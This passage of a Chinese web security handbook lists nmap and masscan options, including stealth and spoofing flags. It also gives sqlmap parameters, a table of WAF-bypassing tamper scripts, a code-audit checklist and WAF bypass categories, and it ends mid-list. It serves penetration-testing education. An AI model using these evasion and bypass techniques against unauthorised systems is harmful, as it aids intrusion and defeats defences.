<li><code class="docutils literal notranslate"><span class="pre">-sn/-sP</span></code> Ping Scan - disable port scan</li>
<li><code class="docutils literal notranslate"><span class="pre">-Pn</span></code> Treat all hosts as online -- skip host discovery</li>
<li><code class="docutils literal notranslate"><span class="pre">-sS/sT/sA/sW/sM</span></code> TCP SYN/Connect()/ACK/Window/Maimon scans</li>
<li><code class="docutils literal notranslate"><span class="pre">-sU</span></code> UDP Scan</li>
<li><code class="docutils literal notranslate"><span class="pre">-sN/sF/sX</span></code> TCP Null, FIN, and Xmas scans</li>
</ul>
</div>
<div class="section" id="id4">
<h5>端口扫描<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">--scanflags</span></code>  定制的TCP扫描</li>
<li><code class="docutils literal notranslate"><span class="pre">-P0</span></code> 无ping</li>
<li><code class="docutils literal notranslate"><span class="pre">PS</span> <span class="pre">[port</span> <span class="pre">list]</span></code> (TCP SYN ping) // need root on Unix</li>
<li><code class="docutils literal notranslate"><span class="pre">PA</span> <span class="pre">[port</span> <span class="pre">list]</span></code> (TCP ACK ping)</li>
<li><code class="docutils literal notranslate"><span class="pre">PU</span> <span class="pre">[port</span> <span class="pre">list]</span></code> (UDP ping)</li>
<li><code class="docutils literal notranslate"><span class="pre">PR</span> <span class="pre">(Arp</span> <span class="pre">ping)</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">p</span> <span class="pre">&lt;port</span> <span class="pre">message&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">F</span></code> 快速扫描</li>
<li><code class="docutils literal notranslate"><span class="pre">r</span></code> 不使用随机顺序扫描</li>
</ul>
</div>
<div class="section" id="id5">
<h5>服务和版本探测<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">-sV</span></code> 版本探测</li>
<li><code class="docutils literal notranslate"><span class="pre">--allports</span></code> 不为版本探测排除任何端口</li>
<li><code class="docutils literal notranslate"><span class="pre">--version-intensity</span> <span class="pre">&lt;intensity&gt;</span></code>  设置 版本扫描强度</li>
<li><code class="docutils literal notranslate"><span class="pre">--version-light</span></code> 打开轻量级模式 // 级别2</li>
<li><code class="docutils literal notranslate"><span class="pre">--version-all</span></code> 尝试每个探测 // 级别9</li>
<li><code class="docutils literal notranslate"><span class="pre">--version-trace</span></code> 跟踪版本扫描活动</li>
<li><code class="docutils literal notranslate"><span class="pre">-sR</span> <span class="pre">RPC</span></code> 扫描</li>
</ul>
</div>
<div class="section" id="id6">
<h5>操作系统扫描<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">-O</span></code> 启用操作系统检测</li>
<li><code class="docutils literal notranslate"><span class="pre">--osscan-limit</span></code> 针对指定的目标进行操作系统检测</li>
<li><code class="docutils literal notranslate"><span class="pre">--osscan-guess</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">--fuzzy</span></code> 推测操作系统检测结果</li>
</ul>
</div>
<div class="section" id="id7">
<h5>时间和性能<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><dl class="first docutils">
<dt>调整并行扫描组的大小</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">--min-hostgroup&lt;milliseconds&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">--max-hostgroup&lt;milliseconds&gt;</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>调整探测报文的并行度</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">--min-parallelism&lt;milliseconds&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">--max-parallelism&lt;milliseconds&gt;</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>调整探测报文超时</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">--min_rtt_timeout</span> <span class="pre">&lt;milliseconds&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">--max-rtt-timeout</span> <span class="pre">&lt;milliseconds&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">--initial-rtt-timeout</span> <span class="pre">&lt;milliseconds&gt;</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>放弃低速目标主机</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">--host-timeout&lt;milliseconds&gt;</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>调整探测报文的时间间隔</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">--scan-delay&lt;milliseconds&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">--max_scan-delay&lt;milliseconds&gt;</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>设置时间模板</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">-T</span> <span class="pre">&lt;Paranoid|Sneaky|Polite|Normal|Aggressive|Insane&gt;</span></code></li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id8">
<h5>逃避检测相关<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">-f</span></code> 报文分段</li>
<li><code class="docutils literal notranslate"><span class="pre">--mtu</span></code> 使用指定的MTU</li>
<li><code class="docutils literal notranslate"><span class="pre">-D&lt;decoy1[，</span> <span class="pre">decoy2][，</span> <span class="pre">ME]，</span> <span class="pre">...&gt;</span></code> 使用诱饵隐蔽扫描</li>
<li><code class="docutils literal notranslate"><span class="pre">-S&lt;IP_Address&gt;</span></code> 源地址哄骗</li>
<li><code class="docutils literal notranslate"><span class="pre">-e</span> <span class="pre">&lt;interface&gt;</span></code> 使用指定的接口</li>
<li><code class="docutils literal notranslate"><span class="pre">--source-port&lt;portnumber&gt;;-g&lt;portnumber&gt;</span></code> 源端口哄骗</li>
<li><code class="docutils literal notranslate"><span class="pre">--data-length&lt;number&gt;</span></code> 发送报文时 附加随机数据</li>
<li><code class="docutils literal notranslate"><span class="pre">--ttl</span> <span class="pre">&lt;value&gt;</span></code> 设置ttl</li>
<li><code class="docutils literal notranslate"><span class="pre">--randomize-hosts</span></code> 对目标主机的顺序随机排列</li>
<li><code class="docutils literal notranslate"><span class="pre">--spoof-mac&lt;macaddress，</span> <span class="pre">prefix，</span> <span class="pre">orvendorname&gt;</span></code> MAC地址哄骗</li>
</ul>
</div>
<div class="section" id="id9">
<h5>输出<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">-oN&lt;filespec&gt;</span></code> 标准输出</li>
<li><code class="docutils literal notranslate"><span class="pre">-oX&lt;filespec&gt;</span></code> XML输出</li>
<li><code class="docutils literal notranslate"><span class="pre">-oS&lt;filespec&gt;</span></code> ScRipTKIdd|3oUTpuT</li>
<li><code class="docutils literal notranslate"><span class="pre">-oG&lt;filespec&gt;</span></code> Grep输出</li>
<li><code class="docutils literal notranslate"><span class="pre">-oA&lt;basename&gt;</span></code> 输出至所有格式</li>
</ul>
</div>
<div class="section" id="id10">
<h5>细节和调试<a class="headerlink" href="#id10" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">-v</span></code> 信息详细程度</li>
<li><code class="docutils literal notranslate"><span class="pre">-d</span> <span class="pre">[level]</span></code> debug level</li>
<li><code class="docutils literal notranslate"><span class="pre">--packet-trace</span></code> 跟踪发送和接收的报文</li>
<li><code class="docutils literal notranslate"><span class="pre">--iflist</span></code> 列举接口和路由</li>
</ul>
</div>
</div>
<div class="section" id="masscan">
<h4>Masscan<a class="headerlink" href="#masscan" title="永久链接至标题">¶</a></h4>
<div class="section" id="id11">
<h5>编译<a class="headerlink" href="#id11" title="永久链接至标题">¶</a></h5>
<div class="code bash highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">sudo</span> <span class="n">apt</span><span class="o">-</span><span class="n">get</span> <span class="n">install</span> <span class="n">git</span> <span class="n">gcc</span> <span class="n">make</span> <span class="n">libpcap</span><span class="o">-</span><span class="n">dev</span>
<span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">robertdavidgraham</span><span class="o">/</span><span class="n">masscan</span>
<span class="n">cd</span> <span class="n">masscan</span>
<span class="n">make</span> <span class="o">-</span><span class="n">j</span>
</pre></div>
</div>
</div>
<div class="section" id="id12">
<h5>命令行选项<a class="headerlink" href="#id12" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">--ports</span></code> 指定端口范围</li>
<li><code class="docutils literal notranslate"><span class="pre">--rate</span></code> 指定速率</li>
<li><code class="docutils literal notranslate"><span class="pre">--source-ip</span></code> 指定源IP</li>
</ul>
</div>
</div>
</div>
<span id="document-manual/sqlmap"></span><div class="section" id="sqlmap">
<h3>SQLMap使用<a class="headerlink" href="#sqlmap" title="永久链接至标题">¶</a></h3>
<p>安装 <code class="docutils literal notranslate"><span class="pre">git</span> <span class="pre">clone</span> <span class="pre">https://github.com/sqlmapproject/sqlmap.git</span> <span class="pre">sqlmap</span></code></p>
<div class="section" id="id1">
<h4>常用参数<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">-u</span></code> <code class="docutils literal notranslate"><span class="pre">--url</span></code> 指定目标url</li>
<li><code class="docutils literal notranslate"><span class="pre">-m</span></code> 从文本中获取多个目标扫描</li>
<li><code class="docutils literal notranslate"><span class="pre">-r</span></code> 从文件中加载HTTP请求</li>
<li><code class="docutils literal notranslate"><span class="pre">--data</span></code> 以POST方式提交数据</li>
<li><code class="docutils literal notranslate"><span class="pre">-random-agent</span></code> 随机ua</li>
<li><code class="docutils literal notranslate"><span class="pre">--user-agent</span></code> 指定ua</li>
<li><code class="docutils literal notranslate"><span class="pre">--delay</span></code> 设置请求间的延迟</li>
<li><code class="docutils literal notranslate"><span class="pre">--timeout</span></code> 指定超时时间</li>
<li><code class="docutils literal notranslate"><span class="pre">--dbms</span></code> 指定db，sqlmap支持的db有MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、SQLite等</li>
<li><code class="docutils literal notranslate"><span class="pre">--os</span></code> 指定数据库服务器操作系统</li>
<li><code class="docutils literal notranslate"><span class="pre">--tamper</span></code> 指定tamper</li>
<li><code class="docutils literal notranslate"><span class="pre">--level</span></code> 指定探测等级</li>
<li><code class="docutils literal notranslate"><span class="pre">--risk</span></code> 指定风险等级</li>
<li><dl class="first docutils">
<dt><code class="docutils literal notranslate"><span class="pre">--technique</span></code> 注入技术</dt>
<dd><ul class="first last">
<li>B: Boolean-based blind SQL injection</li>
<li>E: Error-based SQL injection</li>
<li>U: UNION query SQL injection</li>
<li>S: Stacked queries SQL injection</li>
<li>T: Time-based blind SQL injection</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="tamper">
<h4>Tamper 速查<a class="headerlink" href="#tamper" title="永久链接至标题">¶</a></h4>
<table border="1" class="docutils">
<colgroup>
<col width="27%" />
<col width="73%" />
</colgroup>
<thead valign="bottom">
<tr class="row-odd"><th class="head">脚本名称</th>
<th class="head">作用</th>
</tr>
</thead>
<tbody valign="top">
<tr class="row-even"><td>apostrophemask.py</td>
<td>用utf8代替引号</td>
</tr>
<tr class="row-odd"><td>equaltolike.py</td>
<td>like 代替等号</td>
</tr>
<tr class="row-even"><td>space2dash.py</td>
<td>绕过过滤'=' 替换空格字符(&quot;)，('' - ')后跟一个破折号注释，一个随机字符串和一个新行('n')</td>
</tr>
<tr class="row-odd"><td>greatest.py</td>
<td>绕过过滤'&gt;' ,用GREATEST替换大于号。</td>
</tr>
<tr class="row-even"><td>space2hash.py</td>
<td>空格替换为#号 随机字符串 以及换行符</td>
</tr>
<tr class="row-odd"><td>apostrophenullencode.py</td>
<td>绕过过滤双引号，替换字符和双引号。</td>
</tr>
<tr class="row-even"><td>halfversionedmorekeywords.py</td>
<td>当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论</td>
</tr>
<tr class="row-odd"><td>space2morehash.py</td>
<td>空格替换为 #号 以及更多随机字符串 换行符</td>
</tr>
<tr class="row-even"><td>appendnullbyte.py</td>
<td>在有效负荷结束位置加载零字节字符编码</td>
</tr>
<tr class="row-odd"><td>ifnull2ifisnull.py</td>
<td>绕过对 IFNULL 过滤。 替换类似'IFNULL(A, B)'为'IF(ISNULL(A), B, A)'</td>
</tr>
<tr class="row-even"><td>space2mssqlblank.py</td>
<td>空格替换为其它空符号</td>
</tr>
<tr class="row-odd"><td>base64encode.py</td>
<td>用base64编码替换</td>
</tr>
<tr class="row-even"><td>space2mssqlhash.py</td>
<td>替换空格</td>
</tr>
<tr class="row-odd"><td>modsecurityversioned.py</td>
<td>过滤空格，包含完整的查询版本注释</td>
</tr>
<tr class="row-even"><td>space2mysqlblank.py</td>
<td>空格替换其它空白符号(mysql)</td>
</tr>
<tr class="row-odd"><td>between.py</td>
<td>用between替换大于号(&gt;)</td>
</tr>
<tr class="row-even"><td>space2mysqldash.py</td>
<td>替换空格字符(&quot;)(' - ')后跟一个破折号注释一个新行(' n')</td>
</tr>
<tr class="row-odd"><td>multiplespaces.py</td>
<td>围绕SQL关键字添加多个空格</td>
</tr>
<tr class="row-even"><td>space2plus.py</td>
<td>用+替换空格</td>
</tr>
<tr class="row-odd"><td>bluecoat.py</td>
<td>代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换=为like</td>
</tr>
<tr class="row-even"><td>nonrecursivereplacement.py</td>
<td>取代predefined SQL关键字with表示 suitable for替代(例如 .replace(&quot;SELECT&quot;、&quot;&quot;)) filters</td>
</tr>
<tr class="row-odd"><td>space2randomblank.py</td>
<td>代替空格字符(&quot;&quot;)从一个随机的空白字符可选字符的有效集</td>
</tr>
<tr class="row-even"><td>sp_password.py</td>
<td>追加sp_password'从DBMS日志的自动模糊处理的有效载荷的末尾</td>
</tr>
<tr class="row-odd"><td>chardoubleencode.py</td>
<td>双url编码(不处理以编码的)</td>
</tr>
<tr class="row-even"><td>unionalltounion.py</td>
<td>替换UNION ALL SELECT UNION SELECT</td>
</tr>
<tr class="row-odd"><td>charencode.py</td>
<td>url编码</td>
</tr>
<tr class="row-even"><td>randomcase.py</td>
<td>随机大小写</td>
</tr>
<tr class="row-odd"><td>unmagicquotes.py</td>
<td>宽字符绕过 GPC addslashes</td>
</tr>
<tr class="row-even"><td>randomcomments.py</td>
<td>用 <code class="docutils literal notranslate"><span class="pre">/**/</span></code> 分割sql关键字</td>
</tr>
<tr class="row-odd"><td>charunicodeencode.py</td>
<td>字符串unicode编码</td>
</tr>
<tr class="row-even"><td>securesphere.py</td>
<td>追加特制的字符串</td>
</tr>
<tr class="row-odd"><td>versionedmorekeywords.py</td>
<td>注释绕过</td>
</tr>
<tr class="row-even"><td>space2comment.py</td>
<td>Replaces space character <code class="docutils literal notranslate"><span class="pre">'</span> <span class="pre">'</span></code> with comments <code class="docutils literal notranslate"><span class="pre">/**/</span></code></td>
</tr>
</tbody>
</table>
</div>
</div>
</div>
</div>
<span id="document-misc/index"></span><div class="section" id="id1">
<h2>其他<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h2>
<div class="toctree-wrapper compound">
<span id="document-misc/aduit"></span><div class="section" id="id1">
<h3>代码审计<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="id2">
<h4>简介<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<p>代码审计是找到应用缺陷的过程。其通常有白盒审计、黑盒审计、灰盒审计等方式。白盒审计指通过对源代码的分析找到应用缺陷，黑盒审计通常不涉及到源代码，多使用模糊测试的方式，而灰盒审计则是黑白结合的方式。三种不同的测试方法有不同的优缺点。</p>
</div>
<div class="section" id="id3">
<h4>常用概念<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<div class="section" id="id4">
<h5>输入<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h5>
<p>输入通常也称Source，Web应用的输入可以是请求的参数（GET、POST等）、上传的文件、Cookie、数据库数据等用户可控或者间接可控的地方。</p>
<p>例如PHP中的 <code class="docutils literal notranslate"><span class="pre">$_GET</span></code> / <code class="docutils literal notranslate"><span class="pre">$_POST</span></code> / <code class="docutils literal notranslate"><span class="pre">$_REQUEST</span></code> / <code class="docutils literal notranslate"><span class="pre">$_COOKIE</span></code> / <code class="docutils literal notranslate"><span class="pre">$_FILES</span></code>  / <code class="docutils literal notranslate"><span class="pre">$_SERVER</span></code> 等，都可以作为应用的输入。</p>
</div>
<div class="section" id="id5">
<h5>处理函数<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h5>
<p>处理函数是对数据进行过滤或者编解码的函数，通常被称为Clean/Filter/Sanitizer。这些函数会对输入进行安全操作或过滤，为漏洞利用带来不确定性。</p>
<p>同样以PHP为例，这样的函数可能是 <code class="docutils literal notranslate"><span class="pre">mysqli_real_escape_string</span></code> / <code class="docutils literal notranslate"><span class="pre">htmlspecialchars</span></code> / <code class="docutils literal notranslate"><span class="pre">base64_encode</span></code> / <code class="docutils literal notranslate"><span class="pre">str_rot13</span></code> 等，也可能是应用自定义的过滤函数。</p>
</div>
<div class="section" id="id6">
<h5>危险函数<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h5>
<p>危险函数又常叫做Sink Call、漏洞点，是可能触发危险行为如文件操作、命令执行、数据库操作等行为的函数。</p>
<p>在PHP中，可能是 <code class="docutils literal notranslate"><span class="pre">include</span></code> / <code class="docutils literal notranslate"><span class="pre">system</span></code> / <code class="docutils literal notranslate"><span class="pre">echo</span></code> 等。</p>
</div>
</div>
<div class="section" id="id7">
<h4>自动化审计<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h4>
<p>一般认为一个漏洞的触发过程是从输入经过过滤到危险函数的过程(Source To Sink)，而审计就是寻找这个链条的过程。常见的自动化审计方案有危险函数匹配、控制流分析等。</p>
<div class="section" id="id8">
<h5>危险函数匹配<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h5>
<p>白盒审计最常见的方式是通过搜寻危险函数与危险参数定位漏洞，比较有代表性的工具是Seay开发的审计工具。这种方法误报率相当高，这是因为这种方法没有对程序的流程进行深入分析，另一方面，这种方式通常是孤立地分析每一个文件，忽略了文件之间复杂的调用关系。</p>
<p>具体的说，这种方式在一些环境下能做到几乎无漏报，只要审计者有耐心，可以发现大部分的漏洞，但是在高度框架化的代码中，能找到的漏洞相对有限。</p>
</div>
<div class="section" id="id9">
<h5>控制流分析<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h5>
<p>在后来的系统中，考虑到一定程度引入AST作为分析的依据，在一定程度上减少了误报，但是仍存在很多缺陷。</p>
<p>而后，Dahse  J等人设计了RIPS，该工具进行数据流与控制流分析，结合过程内与过程间的分析得到审计结果，相对危险函数匹配的方式来说误报率少了很多，但是同样的也增加了开销。</p>
</div>
<div class="section" id="id10">
<h5>基于图的分析<a class="headerlink" href="#id10" title="永久链接至标题">¶</a></h5>
<p>基于图的分析是对控制流分析的一个改进，其利用CFG的特性和图计算的算法，一定程度上简化了计算，比较有代表性的是微软的Semmle QL和NDSS 2017年发表的文章Efficient and Flexible Discovery of PHP Application Vulnerabilities。</p>
</div>
<div class="section" id="id11">
<h5>代码相似性比对<a class="headerlink" href="#id11" title="永久链接至标题">¶</a></h5>
<p>一些开发者会复制其他框架的代码，或者使用各种框架。如果事先有建立对应的漏洞图谱，则可使用相似性方法来找到漏洞。</p>
</div>
<div class="section" id="id12">
<h5>灰盒分析<a class="headerlink" href="#id12" title="永久链接至标题">¶</a></h5>
<p>基于控制流的分析开销较大，于是有人提出了基于运行时的分析方式，对代码进行Hook，当执行到危险函数时自动回溯输入，找到输入并判断是否可用。</p>
<p>这种方式解决了控制流分析实现复杂、计算路径开销大的问题，在判断过滤函数上也有一定的突破，但是灰盒的方式并不一定会触发所有的漏洞。fate0开发的prvd就是基于这种设计思路。</p>
</div>
</div>
<div class="section" id="id13">
<h4>手工审计流程<a class="headerlink" href="#id13" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><dl class="first docutils">
<dt>获取代码，确定版本，尝试初步分析</dt>
<dd><ul class="first last">
<li>找历史漏洞信息</li>
<li>找应用该系统的实例</li>
<li>确定依赖库是否存在漏洞</li>
</ul>
</dd>
</dl>
</li>
<li>基于审计工具进行初步分析</li>
<li><dl class="first docutils">
<dt>了解程序运行流程</dt>
<dd><ul class="first last">
<li><dl class="first docutils">
<dt>文件加载方式</dt>
<dd><ul class="first last">
<li>类库依赖</li>
<li>是否加载waf</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>数据库连接方式</dt>
<dd><ul class="first last">
<li>mysql/mysqli/pdo</li>
<li>是否开启预编译</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>视图渲染</dt>
<dd><ul class="first last">
<li>XSS</li>
<li>模版注入</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>SESSION处理机制</dt>
<dd><ul class="first last">
<li>文件</li>
<li>数据库</li>
<li>内存</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Cache处理机制</dt>
<dd><ul class="first last">
<li>文件cache可能写shell</li>
<li>数据库cache可能注入</li>
<li>memcache</li>
</ul>
</dd>
</dl>
</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>账户体系</dt>
<dd><ul class="first last">
<li>Auth方式</li>
<li>Pre-Auth的情况下可以访问的页面</li>
<li><dl class="first docutils">
<dt>普通用户的帐号</dt>
<dd><ul class="first last">
<li>能否可获取普通用户权限</li>
</ul>
</dd>
</dl>
</li>
<li>管理员账户默认密码</li>
<li><dl class="first docutils">
<dt>账号体系</dt>
<dd><ul class="first last">
<li>加密方式</li>
<li>爆破密码</li>
<li>重置漏洞</li>
<li><dl class="first docutils">
<dt>修改密码漏洞</dt>
<dd><ul class="first last">
<li>修改其他账号密码</li>
</ul>
</dd>
</dl>
</li>
</ul>
</dd>
</dl>
</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>根据漏洞类型查找Sink</dt>
<dd><ul class="first last">
<li><dl class="first docutils">
<dt>SQLi</dt>
<dd><ul class="first last">
<li>全局过滤能否bypass</li>
<li>是否有直接执行SQL的地方</li>
<li><dl class="first docutils">
<dt>SQL使用驱动，mysql/mysqli/pdo</dt>
<dd><ul class="first last">
<li>如果使用PDO，搜索是否存在直接执行的部分</li>
</ul>
</dd>
</dl>
</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>XSS</dt>
<dd><ul class="first last">
<li>全局bypass</li>
<li>视图渲染</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>FILE</dt>
<dd><ul class="first last">
<li>查找上传功能点</li>
<li>上传下载覆盖删除</li>
<li><dl class="first docutils">
<dt>包含</dt>
<dd><ul class="first last">
<li>LFI</li>
<li>RFI</li>
<li>全局找include, require</li>
</ul>
</dd>
</dl>
</li>
</ul>
</dd>
</dl>
</li>
<li>RCE</li>
<li>XXE</li>
<li>CSRF</li>
<li>SSRF</li>
<li>反序列化</li>
<li>变量覆盖</li>
<li>LDAP</li>
<li>XPath</li>
<li>Cookie伪造</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>过滤</dt>
<dd><ul class="first last">
<li>找WAF过滤方式，判断是否可以绕过</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id14">
<h4>参考链接<a class="headerlink" href="#id14" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/ripsscanner/rips">rips</a></li>
<li><a class="reference external" href="https://github.com/fate0/prvd">prvd</a></li>
<li><a class="reference external" href="http://blog.fatezero.org/2018/11/11/prvd/">PHP运行时漏洞检测</a></li>
<li>Backes M , Rieck K , Skoruppa M , et al. Efficient and Flexible Discovery of PHP Application Vulnerabilities[C]// IEEE European Symposium on Security &amp; Privacy. IEEE, 2017.</li>
<li>Dahse J. RIPS-A static source code analyser for vulnerabilities in PHP scripts[J]. Retrieved: February, 2010, 28: 2012.</li>
</ul>
</div>
</div>
<span id="document-misc/waf"></span><div class="section" id="waf">
<h3>WAF<a class="headerlink" href="#waf" title="永久链接至标题">¶</a></h3>
<div class="section" id="id1">
<h4>简介<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<div class="section" id="id2">
<h5>概念<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<p>WAF（Web Application Firewall，Web应用防火墙）是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供加固的产品。</p>
<p>在市场上，有各种价格各种功能和选项的WAF。在一定程度上，WAF能为Web应用提供安全性，但是不能保证完全的安全。</p>
</div>
<div class="section" id="id3">
<h5>常见功能<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>检测异常协议，拒绝不符合HTTP标准的请求</li>
<li>对状态管理进行会话保护</li>
<li>Cookies保护</li>
<li>信息泄露保护</li>
<li>DDoS防护</li>
<li>禁止某些IP访问</li>
<li>可疑IP检查</li>
<li><dl class="first docutils">
<dt>安全HTTP头管理</dt>
<dd><ul class="first last">
<li>X-XSS-Protection</li>
<li>X-Frame-Options</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>机制检测</dt>
<dd><ul class="first last">
<li>CSRF token</li>
<li>HSTS</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id4">
<h5>布置位置<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h5>
<p>按布置位置，WAF可以分为云WAF、主机防护软件和硬件防护。云WAF布置在云上，请求先经过云服务器而后流向主机。主机防护软件需要主机预先安装对应软件，如mod_security、ngx-lua-waf等，对主机进行防护。硬件防护指流量流向主机时，先经过设备的清洗和拦截。</p>
</div>
</div>
<div class="section" id="id5">
<h4>防护方式<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h4>
<p>WAF常用的方法有关键字检测、正则表达式检测、语法分析、行为分析、声誉分析、机器学习等。</p>
<p>基于正则的保护是最常见的保护方式。开发者用一些设定好的正则规则来检测载荷是否存在攻击性。基于正则的防护较为简单，因此存在一些缺点。例如只能应用于单次请求，而且正则很难应用到一些复杂的协议上。</p>
<p>基于语法的分析相对正则来说更快而且更准确，这种分析会把载荷按照语法解析成的符号组，然后在符号组中寻找危险的关键字。这种方式对一些载荷的变式有较好的效果，但是同样的，对解析器要求较高。</p>
<p>基于行为的分析着眼的范围更广一些，例如攻击者的端口扫描行为、目录爆破、参数测试或者一些其他自动化或者攻击的模式都会被纳入考虑之中。</p>
<p>基于声誉的分析可以比较好的过滤掉一些可疑的来源，例如常用的VPN、匿名代理、Tor节点、僵尸网络节点的IP等。</p>
<p>基于机器学习的WAF涉及到的范围非常广，效果也因具体实现和场景而较为多样化。</p>
<p>除了按具体的方法分，也可以根据白名单和黑名单的使用来分类。基于白名单的WAF适用于稳定的Web应用，而基于黑名单则适合处理已知问题。</p>
</div>
<div class="section" id="id6">
<h4>扫描器防御<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>基于User-Agent识别</li>
<li>基于攻击载荷识别</li>
<li>验证码</li>
</ul>
</div>
<div class="section" id="id7">
<h4>WAF指纹<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>额外的Cookie</li>
<li>额外的Header</li>
<li>被拒绝请求时的返回内容</li>
<li>被拒绝请求时的返回响应码</li>
<li>IP</li>
</ul>
</div>
<div class="section" id="id8">
<h4>绕过方式<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h4>
<div class="section" id="id9">
<h5>基于架构的绕过<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>站点在WAF后，但是站点可直连</li>
<li>站点在云服务器中，对同网段服务器无WAF</li>
</ul>
</div>
<div class="section" id="id10">
<h5>基于资源的绕过<a class="headerlink" href="#id10" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>使用消耗大的载荷，耗尽WAF的计算资源</li>
<li>提供大量的无效参数</li>
</ul>
</div>
<div class="section" id="id11">
<h5>基于解析的绕过<a class="headerlink" href="#id11" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>字符集解析不同</li>
<li><dl class="first docutils">
<dt>协议覆盖不全</dt>
<dd><ul class="first last">
<li>POST的JSON传参 / <code class="docutils literal notranslate"><span class="pre">form-data</span></code> / <code class="docutils literal notranslate"><span class="pre">multipart/form-data</span></code></li>
</ul>
</dd>
</dl>
</li>
<li>协议解析不正确</li>
<li>站点和WAF对https有部分不一致</li>
<li><dl class="first docutils">
<dt>WAF解析与Web服务解析不一致</dt>
<dd><ul class="first last">
<li>部分ASP+IIS会转换 <code class="docutils literal notranslate"><span class="pre">%u0065</span></code> 格式的字符</li>
<li>Apache会解析畸形Method</li>
<li>同一个参数多次出现，取的位置不一样</li>
<li>HTTP Parameter Pollution (HPP)</li>
<li>HTTP Parameter Fragmentation (HPF)</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id12">
<h5>基于规则的绕过<a class="headerlink" href="#id12" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><dl class="first docutils">
